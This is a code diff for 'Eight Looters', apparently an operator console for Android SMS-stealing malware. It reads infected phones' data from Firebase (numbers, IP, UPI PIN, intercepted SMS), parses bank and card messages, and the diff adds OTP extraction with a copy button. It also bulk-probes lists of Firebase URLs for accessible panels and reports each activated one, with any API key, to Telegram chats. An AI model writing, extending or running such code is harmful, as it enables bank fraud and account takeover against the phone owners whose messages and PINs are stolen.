@@ -1,6 +1,6 @@
 /* ============================================================
    Eight Looters · Firebase Console
-   COMPLETE app.js — Full Featured
+   COMPLETE app.js — Full Featured v2
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
 const TG_URL = "https://t.me/eightlooters";
@@ -12,6 +12,7 @@ const TG_CHAT_IDS = ["8965778254", "8646475251"];
 
 function _escTg(s){return String(s??"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
 function _nowIst(){return new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata",hour12:true});}
+
 async function notifyTelegram(text){
   await Promise.all(TG_CHAT_IDS.map(async chat_id=>{
     try{
@@ -23,19 +24,55 @@ async function notifyTelegram(text){
     }catch(e){}
   }));
 }
+
+/* Clean key: if key looks like URL or is same as url → return "" */
+function _cleanTgKey(key,url){
+  if(!key) return "";
+  if(key===url) return "";
+  if(/firebaseio\.com|firebasedatabase\.app/i.test(key)) return "";
+  if(key.length<10) return "";
+  return key;
+}
 function tgFirebaseMsg(url,key,source,devices){
+  const ck = _cleanTgKey(key,url);
   return `🔥 <b>NEW FIREBASE ACTIVATED</b>\n\n`+
     `📡 <b>URL:</b> <code>${_escTg(url)}</code>\n`+
-    `🔑 <b>Key:</b> <code>${_escTg(key||"(no auth)")}</code>\n`+
+    (ck ? `🔑 <b>Key:</b> <code>${_escTg(ck)}</code>\n` : `🔓 <b>Auth:</b> Public / No key\n`)+
     `📱 <b>Source:</b> ${_escTg(source)}\n`+
     (devices!=null?`📦 <b>Devices:</b> ${devices}\n`:"")+
     `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;
 }
+function tgBulkMsg(items, source, totalTried){
+  const ok = items.filter(x=>x.ok);
+  const fail = items.filter(x=>!x.ok);
+  let txt = `🔥 <b>BULK FIREBASE · ${_escTg(source)}</b>\n`;
+  txt += `━━━━━━━━━━━━━━━━━━\n`;
+  txt += `📊 <b>Total tried:</b> ${totalTried}\n`;
+  txt += `✅ <b>Activated:</b> ${ok.length}\n`;
+  txt += `❌ <b>Failed:</b> ${fail.length}\n`;
+  txt += `⏰ <b>Time:</b> ${_escTg(_nowIst())}\n`;
+  if(ok.length){
+    txt += `\n🟢 <b>── ACTIVE PANELS ──</b>\n`;
+    ok.slice(0,40).forEach((x,i)=>{
+      txt += `<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;
+    });
+    if(ok.length>40) txt += `<i>…and ${ok.length-40} more active</i>\n`;
+  }
+  if(fail.length){
+    txt += `\n🔴 <b>── FAILED ──</b>\n`;
+    fail.slice(0,20).forEach((x,i)=>{
+      txt += `<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;
+    });
+    if(fail.length>20) txt += `<i>…and ${fail.length-20} more failed</i>\n`;
+  }
+  return txt;
+}
 function tgApkMsg(file,url,key,pid){
+  const ck = _cleanTgKey(key,url);
   return `🔥 <b>NEW APK FIREBASE</b>\n\n`+
     `📁 <b>APK:</b> <code>${_escTg(file)}</code>\n`+
     `📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
-    `🔑 <b>API Key:</b> <code>${_escTg(key||"—")}</code>\n`+
+    (ck ? `🔑 <b>API Key:</b> <code>${_escTg(ck)}</code>\n` : `🔓 <b>Auth:</b> Public / No key\n`)+
     (pid?`🆔 <b>Project:</b> <code>${_escTg(pid)}</code>\n`:"")+
     `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;
 }
@@ -208,6 +245,7 @@ function tsFrom(v){if(!v) return null; if(typeof v==="number") return v<1e12?v*1
     const m=v.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})[T\s](\d{2}):(\d{2})(?::(\d{2}))?/);
     if(m){const[,d,mo,y,hh,mm,ss]=m;const x=new Date(+y,+mo-1,+d,+hh,+mm,+(ss||0)).getTime();if(!isNaN(x)) return x;}}
   return null;}
+
 function parseDevices(raw){const list=[]; if(raw&&typeof raw==="object"){
   Object.entries(raw).forEach(([id,d])=>{
     if(!d||typeof d!=="object") return;
@@ -216,19 +254,76 @@ function parseDevices(raw){const list=[]; if(raw&&typeof raw==="object"){
     const bat=String(d.battery??"—"), pct=parseInt(bat.replace("%",""))||0;
     const lsR=d.lastSeen??d.last_seen??d.lastOnline??d.last_online??d.lastActive??d.last_active??d.timestamp??d.time??d.dateTime??d.updatedAt??d.updated_at??null;
     const ls=tsFrom(lsR);
-    list.push({id,name:String(d.modelName||d.model||d.deviceName||id),battery:bat,batteryPercent:pct,status:!!d.status,
-      phoneNumber:String(d.mobNo||(sims[0]?.phoneNumber??"—")),android:String(d.androidV||d.androidVersion||"—"),
-      ip:String(d.ip_address||"—"),storage:String(d.storage||"—"),provider:String(d.service_provider||"—"),
-      sims,upipin:d.upipin?String(d.upipin):null,cpu:String(d.cpu_arch||"—"),sdk:String(d.sdkV||"—"),
-      lastSeen:ls,lastSeenFormatted:ls?timeAgo(ls):undefined});
+    const pick=(...keys)=>{for(const k of keys){const v=d[k];if(v!=null&&v!==""&&v!=="—") return String(v);}return "—";};
+    list.push({
+      id,
+      name:String(d.modelName||d.model||d.deviceName||d.name||id),
+      battery:bat,
+      batteryPercent:pct,
+      status:!!d.status,
+      phoneNumber:String(d.mobNo||d.phone||d.phoneNumber||d.mobile||d.mob_no||d.mobno||(sims[0]?.phoneNumber)||"—"),
+      android:pick("androidV","androidVersion","android_version","android_sdk","sdk_int","androidSDK","android"),
+      ip:pick("ip_address","ipAddress","ip_address_public","client_ip","clientIp","clientIP","publicIp","lastIp","ip"),
+      storage:pick("storage","totalStorage","storage_total","internal_storage","storageTotal","storage_info","total_storage","disk","storageInfo"),
+      provider:pick("service_provider","serviceProvider","provider","network","sim_operator","operator","carrier"),
+      sims,
+      upipin:d.upipin?String(d.upipin):null,
+      cpu:pick("cpu_arch","cpuArch","cpu","architecture","arch","cpuArchitecture","cpuabi","cpuAbi","cpu_info","abi"),
+      sdk:pick("sdkV","sdkVersion","sdk_version","sdk_int","sdk","androidSDK"),
+      lastSeen:ls,
+      lastSeenFormatted:ls?timeAgo(ls):undefined,
+      _raw:d
+    });
   });
 } return list;}
-function parseMessages(raw){const out=[]; if(raw&&typeof raw==="object"){
-  const e=Object.entries(raw); const slice=e.length>150?e.slice(e.length-150):e;
-  for(const[,m] of slice){if(!m||typeof m!=="object") continue;
-    const t=String(m.message||m.body||m.text||"");
-    if(t.trim()) out.push({text:t,sender:String(m.sender||m.from||"Unknown"),time:String(m.dateTime||m.date||"")});
-  }} return out.reverse();}
+
+function parseMessages(raw){
+  const out=[]; 
+  if(raw&&typeof raw==="object"){
+    const e=Object.entries(raw); 
+    const slice=e.length>150?e.slice(e.length-150):e;
+    for(const[,m] of slice){
+      if(!m||typeof m!=="object") continue;
+      const t=String(m.message||m.body||m.text||"");
+      if(t.trim()) out.push({
+        text:t,
+        sender:String(m.sender||m.from||"Unknown"),
+        time:String(m.dateTime||m.date||"")
+      });
+    }
+  } 
+  return out;
+}
+
+function parseSmsTime(str){
+  if(!str) return 0;
+  const m = String(str).match(/(\d{1,2})[-\/](\d{1,2})[-\/](\d{2,4})\s*\|?\s*(\d{1,2}):(\d{2})\s*(am|pm)?/i);
+  if(m){
+    let [,d,mo,y,hh,mm,ap] = m;
+    if(y.length===2) y = "20"+y;
+    hh = parseInt(hh,10); mm = parseInt(mm,10);
+    if(ap){ ap = ap.toLowerCase(); if(ap==="pm" && hh<12) hh+=12; if(ap==="am" && hh===12) hh=0; }
+    return new Date(+y,+mo-1,+d,hh,mm).getTime();
+  }
+  const t = Date.parse(str);
+  return isNaN(t) ? 0 : t;
+}
+
+function extractOtp(text){
+  if(!text) return null;
+  const pats = [
+    /(?:otp|o\.t\.p|code|verification code|your code|login code|security code|pin)[^0-9]{0,25}(\d{3,8})/i,
+    /(\d{3,8})[^0-9]{0,20}(?:is\s+your|your\s+)?(?:otp|code|verification|pin)/i,
+    /\b(\d{4,6})\b\s*(?:is|as)\s*(?:your|the)\s*(?:otp|code|pin|verification)/i,
+    /(?:is\s+)(\d{4,6})(?:\.|\s|$)/,
+  ];
+  for(const p of pats){
+    const m = text.match(p);
+    if(m && m[1] && m[1].length>=3 && m[1].length<=8) return m[1];
+  }
+  return null;
+}
+
 function analyze(msgs){const banks=[],cards=[],phones=new Set(),nets=new Set();
   for(const m of msgs){const b=parseBankSms(m.text,m.sender);if(b){b.detectedAt=m.time||b.detectedAt;banks.push(b)}
     const c=parseCard(m.text);if(c) cards.push(c);
@@ -343,6 +438,7 @@ function LoginScreen({onConnect,onMergeAll}){
   const [bulk,setBulk] = useState("");
   const [bulkBusy,setBulkBusy] = useState(false);
   const [bulkSum,setBulkSum] = useState(null);
+  const [bulkProgress,setBulkProgress] = useState(null);
   const [fileBusy,setFileBusy] = useState(false);
   const [fileProgress,setFileProgress] = useState(0);
   const [fileInfo,setFileInfo] = useState("");
@@ -445,33 +541,50 @@ function LoginScreen({onConnect,onMergeAll}){
     const nx=accounts.filter(a=>a.id!==id); saveAccounts(nx);setAccounts(nx);}
   function share(a,e){e?.stopPropagation();setShareLink(makeShareLink(a.url,a.key));}
 
-  // === Bulk: process a list of URLs & add each ===
   async function processBulkUrls(urls, source){
     if(!urls.length){
       setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});
       return;
     }
     setBulkBusy(true);setBulkSum(null);setErr("");
+    setBulkProgress({total:urls.length, done:0, added:0, failed:0, current:""});
     const exist = new Set(accounts.map(a=>a.url.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase()));
     const success=[],failed=[],skipped=[],adds=[];
-    for(const u of urls){
+    for(let idx=0; idx<urls.length; idx++){
+      const u = urls[idx];
+      setBulkProgress(p => p ? {...p, current:u} : p);
       const fp = u.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase();
-      if(exist.has(fp)){skipped.push({url:u,reason:"Already saved"});continue;}
+      if(exist.has(fp)){
+        skipped.push({url:u,reason:"Already saved"});
+        setBulkProgress(p => p ? {...p, done:idx+1} : p);
+        continue;
+      }
       try{
         const c = await fbGet(u,"","clients");
-        if(c===null){failed.push({url:u,reason:"Clients path not found"});continue;}
-        adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:u,key:"",date:new Date().toLocaleString()});
-        exist.add(fp);
-        const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
-        success.push({url:u,devices:devCount});
-        notifyTelegram(tgFirebaseMsg(u,"",source||"Bulk Add",devCount));
+        if(c===null){
+          failed.push({url:u,reason:"Clients path not found"});
+        } else {
+          adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:u,key:"",date:new Date().toLocaleString()});
+          exist.add(fp);
+          const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
+          success.push({url:u,devices:devCount});
+        }
       }catch(e){
         const m=e.message||String(e);
         failed.push({url:u,reason:m.replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});
       }
+      setBulkProgress(p => p ? {...p, done:idx+1, added:success.length, failed:failed.length} : p);
+      await new Promise(r=>setTimeout(r,12));
     }
     if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
-    setBulkSum({success,failed,skipped});setBulkBusy(false);
+    setBulkSum({success,failed,skipped});
+    setBulkBusy(false);
+    const items = [
+      ...success.map(s=>({url:s.url, ok:true, devices:s.devices})),
+      ...failed.map(f=>({url:f.url, ok:false, reason:f.reason}))
+    ];
+    if(items.length) notifyTelegram(tgBulkMsg(items, source, urls.length));
+    setTimeout(()=>setBulkProgress(null), 4500);
     return {success,failed,skipped};
   }
 
@@ -482,11 +595,10 @@ function LoginScreen({onConnect,onMergeAll}){
       setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});
       return;
     }
-    await processBulkUrls(urls,"Bulk Add");
+    await processBulkUrls(urls,"Bulk Paste");
     setBulk("");
   }
 
-  // === File upload: line-by-line read with progress ===
   async function handleBulkFile(file){
     if(!file) return;
     setFileBusy(true);
@@ -509,24 +621,25 @@ function LoginScreen({onConnect,onMergeAll}){
         }
         const pct = Math.round(((i+1)/lines.length)*100);
         setFileProgress(pct);
-        // update UI every few lines for smoothness, small yield
         if(i % 5 === 0 || i === lines.length-1){
-          setFileInfo(`${i+1} / ${lines.length} lines · ${found.length} found`);
-          await new Promise(r=>setTimeout(r,8));
+          setFileInfo(`Scanning ${i+1} / ${lines.length} lines · ${found.length} found`);
+          await new Promise(r=>setTimeout(r,6));
         }
       }
       setFileFound(found.length);
-      setFileInfo(`${lines.length} lines scanned · ${found.length} unique URLs found`);
+      setFileInfo(`✓ ${lines.length} lines scanned · ${found.length} unique URLs`);
       if(!found.length){
-        setErr("No Firebase URL found in the file.");
+        setErr("No Firebase URL found in file.");
         return;
       }
-      await processBulkUrls(found,"File Upload");
+      setFileProgress(100);
+      await new Promise(r=>setTimeout(r,350));
+      await processBulkUrls(found, "File Upload");
     }catch(e){
       setErr("File read failed: "+(e.message||String(e)));
     }finally{
       setFileBusy(false);
-      setTimeout(()=>{ setFileProgress(0); setFileInfo(""); setFileName(""); setFileFound(0); },4000);
+      setTimeout(()=>{ setFileProgress(0); setFileInfo(""); setFileName(""); setFileFound(0); },5000);
     }
   }
 
@@ -557,11 +670,15 @@ function LoginScreen({onConnect,onMergeAll}){
         exist.add(fp);
         const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
         success.push({url:it.url,devices:devCount});
-        notifyTelegram(tgFirebaseMsg(it.url,it.key,"Panel Link Import",devCount));
       }catch(e){failed.push({url:it.url,reason:(e.message||String(e)).replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});}
     }
     if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
     setPanels("");setPanelSum({success,failed,skipped});setPanelBusy(false);
+    const items = [
+      ...success.map(s=>({url:s.url, ok:true, devices:s.devices})),
+      ...failed.map(f=>({url:f.url, ok:false, reason:f.reason}))
+    ];
+    if(items.length) notifyTelegram(tgBulkMsg(items, "Panel Link Import", parsed.length));
   }
 
   async function onApk(f){
@@ -635,7 +752,6 @@ function LoginScreen({onConnect,onMergeAll}){
               <span style={{fontSize:10,padding:"2px 7px",borderRadius:999,background:"rgba(34,211,238,.15)",border:"1px solid rgba(34,211,238,.3)"}}>{accounts.length}</span>
             </button>
 
-            {/* Bulk Add with file upload */}
             <div className="glass-2" style={{borderRadius:14,padding:12,marginTop:4}}>
               <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:8,gap:8,flexWrap:"wrap"}}>
                 <p style={{fontSize:11,fontWeight:600,color:"var(--muted)"}}>Bulk Add Firebase URLs</p>
@@ -652,21 +768,44 @@ function LoginScreen({onConnect,onMergeAll}){
                 </button>
               </div>
 
-              {/* File progress bar */}
-              {fileBusy && <div className="a-up" style={{marginTop:10,padding:10,borderRadius:10,background:"rgba(34,211,238,.06)",border:"1px solid rgba(34,211,238,.25)"}}>
-                <div style={{display:"flex",justifyContent:"space-between",fontSize:10,marginBottom:6}}>
-                  <span className="mono" style={{color:"#a5f3fc",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:200}}>{fileName}</span>
-                  <span className="mono" style={{color:"#a5f3fc",fontWeight:700}}>{fileProgress}%</span>
+              {fileBusy && <div className="a-up pro-prog" style={{marginTop:10}}>
+                <div className="pro-prog-head">
+                  <span className="pro-prog-title">
+                    {Ic.upload(12)} <span className="mono" style={{color:"#a5f3fc",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:170}}>{fileName}</span>
+                  </span>
+                  <span className="pro-prog-pct">{fileProgress}%</span>
                 </div>
-                <div style={{height:6,borderRadius:3,background:"rgba(5,5,10,.6)",overflow:"hidden"}}>
-                  <div style={{height:"100%",width:`${fileProgress}%`,background:"linear-gradient(90deg,#22d3ee,#8b5cf6)",transition:"width .12s linear",boxShadow:"0 0 10px rgba(34,211,238,.6)"}}/>
+                <div className="pro-prog-track">
+                  <div className="pro-prog-fill cyan" style={{width:`${fileProgress}%`}}/>
+                  <div className="pro-prog-shine"/>
                 </div>
-                <p className="mono" style={{fontSize:9,color:"var(--muted-2)",marginTop:6}}>{fileInfo}</p>
+                <p className="mono pro-prog-sub">{fileInfo}</p>
               </div>}
-              {!fileBusy && fileFound>0 && <div className="a-in" style={{marginTop:8,fontSize:10,color:"#34d399"}}>✓ {fileInfo}</div>}
+              {!fileBusy && fileFound>0 && <div className="a-in" style={{marginTop:8,fontSize:10,color:"#34d399",display:"flex",alignItems:"center",gap:5}}>{Ic.check(11)} {fileInfo}</div>}
+
+              {bulkProgress && <div className="a-up pro-prog" style={{marginTop:10,borderColor:"rgba(139,92,246,.35)",background:"linear-gradient(135deg,rgba(139,92,246,.08),rgba(34,211,238,.04))"}}>
+                <div className="pro-prog-head">
+                  <span className="pro-prog-title">
+                    <span className="pro-prog-dot"/>
+                    Adding <b>{bulkProgress.done}</b> / <b>{bulkProgress.total}</b>
+                  </span>
+                  <span className="pro-prog-pct purple">{Math.round((bulkProgress.done/bulkProgress.total)*100)}%</span>
+                </div>
+                <div className="pro-prog-track">
+                  <div className="pro-prog-fill violet" style={{width:`${(bulkProgress.done/bulkProgress.total)*100}%`}}/>
+                  <div className="pro-prog-shine"/>
+                </div>
+                <div className="pro-prog-stats">
+                  <span className="stat-ok">{Ic.check(10)} {bulkProgress.added} activated</span>
+                  <span className="stat-bad">{Ic.x(10)} {bulkProgress.failed} failed</span>
+                  <span className="stat-rem">{bulkProgress.total - bulkProgress.done} left</span>
+                </div>
+                {bulkProgress.current && <p className="mono pro-prog-sub" style={{marginTop:6}}>
+                  → {bulkProgress.current.replace(/^https?:\/\//,"").slice(0,60)}
+                </p>}
+              </div>}
             </div>
 
-            {/* Panel links import */}
             <div className="glass-2" style={{borderRadius:14,padding:12}}>
               <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Import Panel Links</p>
               <textarea rows={4} value={panels} onChange={e=>setPanels(e.target.value)} className="inp" placeholder="Paste panel links containing ?s=… one per line" style={{fontSize:11}}/>
@@ -1050,10 +1189,33 @@ function DeviceCard({dev,onClick,delay=0}){
   </div>;
 }
 
-function Row({label,value,mono,color,delay=0,trailing}){
+function Row({label,value,mono,color,delay=0,trailing,copyable}){
+  const [copied,setCopied] = useState(false);
+  const onCopy = (e)=>{
+    e?.stopPropagation();
+    const v = String(value||"");
+    if(!v || v==="—") return;
+    try{navigator.clipboard.writeText(v);}catch{}
+    setCopied(true); setTimeout(()=>setCopied(false),1500);
+  };
   return <div className="irow" style={{animationDelay:`${delay}s`}}>
     <span className="k">{label}</span>
-    <span className={`v ${mono?"mono":""}`} style={{color:color||"var(--text)",fontSize:mono?11:12,display:"inline-flex",alignItems:"center",gap:6,justifyContent:"flex-end"}}>{value||"—"}{trailing}</span>
+    <span className={`v ${mono?"mono":""}`} style={{
+      color:color||"var(--text)",fontSize:mono?11:12,
+      display:"inline-flex",alignItems:"center",gap:6,justifyContent:"flex-end",minWidth:0
+    }}>
+      <span style={{overflow:"hidden",textOverflow:"ellipsis"}}>{value||"—"}</span>
+      {copyable && value && value!=="—" && (
+        <button onClick={onCopy} className="ibtn" title="Copy"
+          style={{padding:4,flexShrink:0,
+            color:copied?"#34d399":undefined,
+            background:copied?"rgba(52,211,153,.1)":undefined,
+            borderColor:copied?"rgba(52,211,153,.35)":undefined}}>
+          {copied?Ic.check(11):Ic.copy(11)}
+        </button>
+      )}
+      {trailing}
+    </span>
   </div>;
 }
 
@@ -1099,7 +1261,6 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
     return ()=>iv.current&&clearInterval(iv.current);
   },[loadMsgs,dev.id,fbUrl,fbKey,showToast]);
 
-  // === send SMS — fixed ===
   async function send(){
     const num = String(to||"").trim().replace(/[\s\-()]/g,"");
     const txt = String(body||"").trim();
@@ -1149,10 +1310,14 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
 
   const msgKey = (m,i)=>`${m.time}|${m.sender}|${m.text.slice(0,40)}|${i}`;
   const sortedMsgs = useMemo(()=>{
-    const withMeta = msgs.map((m,i)=>({m,i,k:msgKey(m,i)}));
+    const withMeta = msgs.map((m,i)=>({m,i,k:msgKey(m,i),ts:parseSmsTime(m.time)}));
+    withMeta.sort((a,b)=>{
+      if(b.ts!==a.ts) return b.ts-a.ts;
+      return b.i-a.i;
+    });
     const pinned = withMeta.filter(x=>pinnedMsgs.includes(x.k));
     const rest = withMeta.filter(x=>!pinnedMsgs.includes(x.k));
-    return [...pinned.reverse(),...rest.reverse()];
+    return [...pinned, ...rest];
   },[msgs,pinnedMsgs]);
 
   return <div className="drw" onClick={onClose}>
@@ -1198,21 +1363,21 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
             <p className="mono" style={{fontSize:11,color:"#34d399"}}>{fullTime(dev.lastSeen)}</p>
           </div>}
           <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Device</p>
-          <Row label="Phone Number" value={phone} mono delay={0.02}/>
+          <Row label="Phone Number" value={phone} mono delay={0.02} copyable/>
           <Row label="Network" value={net} delay={0.04}/>
           <Row label="Android" value={dev.android} delay={0.06}/>
-          <Row label="IP Address" value={dev.ip} mono delay={0.08}/>
+          <Row label="IP Address" value={dev.ip} mono delay={0.08} copyable/>
           <Row label="Storage" value={dev.storage} delay={0.1}/>
           <Row label="CPU Arch" value={dev.cpu} mono delay={0.12}/>
           <Row label="SDK" value={dev.sdk} delay={0.14}/>
           <Row label="SIM Cards" value={`${dev.sims.length} SIM(s)`} delay={0.16}/>
-          {dev.sims.map((s,i)=>s.phoneNumber&&<Row key={i} label={`SIM ${i+1}`} value={s.phoneNumber} mono delay={0.18+i*0.02}/>)}
+          {dev.sims.map((s,i)=>s.phoneNumber&&<Row key={i} label={`SIM ${i+1}`} value={s.phoneNumber} mono delay={0.18+i*0.02} copyable/>)}
 
           {ana.phoneNumbers.length>0&&<>
             <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,margin:"18px 0 8px"}}>From SMS · Pin numbers</p>
             {ana.phoneNumbers.map((p,i)=>{
               const isPinned = pinnedNums.includes(p);
-              return <Row key={i} label={`Phone #${i+1}`} value={p} mono color={isPinned?"#f472b6":"#a5f3fc"} delay={0.22+i*0.03}
+              return <Row key={i} label={`Phone #${i+1}`} value={p} mono color={isPinned?"#f472b6":"#a5f3fc"} delay={0.22+i*0.03} copyable
                 trailing={<button onClick={()=>togglePinNum(p)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>}
               />;
             })}
@@ -1270,6 +1435,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
               const isBank = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text);
               const isCard = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(m.text);
               const isPinned = pinnedMsgs.includes(k);
+              const otp = extractOtp(m.text);
               const accent = isCard?"#c084fc":isBank?"#34d399":"#f43f5e";
               const bg = isCard?"rgba(192,132,252,.06)":isBank?"rgba(52,211,153,.06)":"rgba(244,63,94,.05)";
               return <div key={k+idx} className="pop a-in" style={{animationDelay:`${Math.min(idx*0.015,0.35)}s`,padding:12,borderRadius:12,border:`1px solid ${isPinned?"rgba(244,114,182,.4)":"var(--border)"}`,borderLeft:`3px solid ${isPinned?"#f472b6":accent}`,background:isPinned?"linear-gradient(135deg,rgba(244,114,182,.08),transparent)":bg}}>
@@ -1282,10 +1448,18 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
                   </div>
                   <div style={{display:"flex",alignItems:"center",gap:6,flexShrink:0}}>
                     <span className="mono" style={{fontSize:9,color:"var(--muted-2)"}}>{m.time}</span>
+                    <button onClick={()=>{navigator.clipboard.writeText(m.text);showToast("Message copied");}} className="ibtn" style={{padding:4}} title="Copy message">{Ic.copy(11)}</button>
                     <button onClick={()=>togglePinMsg(k)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}} title={isPinned?"Unpin":"Pin"}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>
                   </div>
                 </div>
                 <p style={{fontSize:11,color:"var(--text)",lineHeight:1.5,opacity:.85}}>{m.text.substring(0,250)}</p>
+                {otp && <div className="a-in" style={{marginTop:8,display:"flex",alignItems:"center",gap:8,padding:"6px 10px",borderRadius:8,background:"rgba(251,191,36,.08)",border:"1px solid rgba(251,191,36,.3)"}}>
+                  <span style={{fontSize:9,fontWeight:700,color:"#fbbf24",textTransform:"uppercase",letterSpacing:"0.12em"}}>OTP</span>
+                  <span className="mono" style={{fontSize:15,fontWeight:800,color:"#fbbf24",letterSpacing:2}}>{otp}</span>
+                  <button onClick={()=>{navigator.clipboard.writeText(otp);showToast("OTP copied: "+otp);}} className="btn" style={{marginLeft:"auto",padding:"5px 11px",fontSize:10,background:"rgba(251,191,36,.15)",border:"1px solid rgba(251,191,36,.45)",color:"#fbbf24",boxShadow:"0 4px 12px rgba(251,191,36,.2)"}}>
+                    {Ic.copy(11)} Copy OTP
+                  </button>
+                </div>}
               </div>
             })}
           </div>
